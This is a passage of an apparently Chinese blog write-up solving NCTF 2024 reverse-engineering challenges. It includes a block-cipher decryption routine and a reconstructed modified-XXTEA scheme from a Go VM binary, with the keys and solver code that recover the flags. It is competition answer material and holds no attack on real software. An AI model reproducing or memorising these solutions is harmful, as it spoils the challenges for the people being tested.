class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">uint32_t</span> cipher_dword<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cipher_dword<span class=\"token punctuation\">,</span> ciphertext <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> ii<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        buf_1<span class=\"token punctuation\">[</span><span class=\"token number\">35</span> <span class=\"token operator\">-</span> ii<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF0000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cipher_dword <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> m <span class=\"token operator\">=</span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span> m <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> m<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">uint32_t</span> v12_0 <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> v12_bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12_0<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> \n        <span class=\"token punctuation\">&#123;</span>\n            v12_bytes<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> byte_7FF699A4A0D0<span class=\"token punctuation\">[</span>v12_bytes<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">uint32_t</span> rot1 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot2 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot3 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot4 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12_0<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> L_result <span class=\"token operator\">=</span> rot1 <span class=\"token operator\">^</span> rot2 <span class=\"token operator\">^</span> rot3 <span class=\"token operator\">^</span> rot4 <span class=\"token operator\">^</span> v12_0<span class=\"token punctuation\">;</span>\n        buf_1<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> buf_1<span class=\"token punctuation\">[</span>m <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> L_result<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">uint32_t</span> v11 <span class=\"token operator\">=</span> buf_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b0 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v11 <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint8_t</span> b3 <span class=\"token operator\">=</span> v11 <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> le <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> b0<span class=\"token punctuation\">;</span>\n        <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>plaintext <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>le<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main_safe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint8_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"NCTF24nctfNCTF24\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>enc<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> flag<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"NCTF&#123;%.32s&#125;\\n\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<h3 id=\"gogo\"><a href=\"#gogo\" class=\"headerlink\" title=\"gogo\"></a>gogo</h3><p>main_main函数可以看到是将输入分块通过channel进行协程通信。</p>\n<p><img src=\"/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png\" loading=\"lazy\"></p>\n<p>在main_main函数附件有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用函数计算。这边一系列计算函数也印证想法。</p>\n<p><img src=\"/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png\" loading=\"lazy\"></p>\n<p>对每个vm的函数都下断点输出，如XOR这样：</p>\n<p><img src=\"/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png\" loading=\"lazy\"></p>\n<p>运行输入可以得到一堆伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。</p>\n<p><img src=\"/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png\" loading=\"lazy\"></p>\n<p><img src=\"/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png\" loading=\"lazy\"></p>\n<p>通过分析可得知是将flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。</p>\n<p>还原加密代码如下，基于标准XXTEA进行修改的：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DELTA</span> <span class=\"token expression\"><span class=\"token number\">0x9e3779b9</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">>></span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX2</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x6e637466</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62ef0ed</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0xa78c0b4f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32303234</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">uint32_t</span> key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x32303234</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd6eb12c3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f1cf72e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4e435446</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> p<span class=\"token punctuation\">,</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        sum <span class=\"token operator\">+=</span> DELTA<span class=\"token punctuation\">;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> MX<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> p<span class=\"token punctuation\">,</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        sum <span class=\"token operator\">+=</span> DELTA<span class=\"token punctuation\">;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> MX2<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。</p>\n<p><img src=\"/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png\" loading=\"lazy\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DELTA</span> <span class=\"token expression\"><span class=\"token number\">0x9e3779b9</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">>></span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX2</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x6e637466</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62ef0ed</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0xa78c0b4f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32303234</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">uint32_t</span> key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x32303234</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd6eb12c3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f1cf72e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4e435446</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_decrypt1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> DELTA <span class=\"token operator\">*</span> rounds<span class=\"token punctuation\">;</span>\n    y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> p <span class=\"token operator\">=</span> <span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token 